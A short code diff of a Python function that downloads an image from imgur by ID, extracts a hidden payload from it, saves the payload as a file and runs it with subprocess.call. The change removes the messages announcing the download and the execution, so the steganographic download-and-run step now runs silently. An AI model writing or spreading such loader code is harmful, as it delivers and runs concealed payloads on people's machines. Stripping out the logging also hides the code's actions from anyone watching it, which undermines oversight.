@@ -77,7 +77,6 @@ def execute(imgur_id):
     # download an image w/ ID use https://imgur.com/download/{imgur_id}
     url = "https://imgur.com/download/{}".format(imgur_id)
     image_file = imgur_id + ".png"
-    print("downloading image:", url)
     r = requests.get(url, allow_redirects=True)
 
     with open(image_file, "wb") as fd_out:
@@ -88,8 +87,7 @@ def execute(imgur_id):
     imgmsg = imgMsgFromImage(image_file)
     imgmsg.exportMsgToFile(save_file)
 
-    # subprocess.call([r"C:\Temp\a b c\Notepad.exe"])
-    print("executing binary:", save_file)
+    # execution
     subprocess.call([save_file])
 
     # if successfully executed
